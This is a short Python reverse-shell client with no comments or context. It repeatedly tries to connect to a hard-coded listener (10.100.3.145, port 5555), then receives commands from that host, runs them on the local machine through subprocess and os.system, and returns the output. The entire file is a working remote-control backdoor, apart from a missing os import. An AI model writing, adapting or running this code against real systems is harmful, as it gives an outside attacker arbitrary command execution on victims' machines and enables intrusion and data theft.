
import socket
import threading
import sys
import time
import subprocess as sp
LHOST = "10.100.3.145"
LPORT = 5555

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def TryAgain():
    while True:
        try:
            client.connect((LHOST,LPORT))
            Cont()
            break
        except:
            pass

def Cont():
    def getCommand():
        while True:
           # try:
            msg = client.recv(2048).decode()
            output = sp.getoutput(msg)
            if output != '':
                client.send(output.encode())
            else:
                os.system(msg)
            #except:
              #  print('Error')

    def sendConnection():     
        client.send('NEW CLIENT CONNECTED!'.encode())
    commandThread = threading.Thread(target=getCommand)
    commandThread.start()
    sendConnection()
tryagainthread = threading.Thread(target=TryAgain)
tryagainthread.start()
    
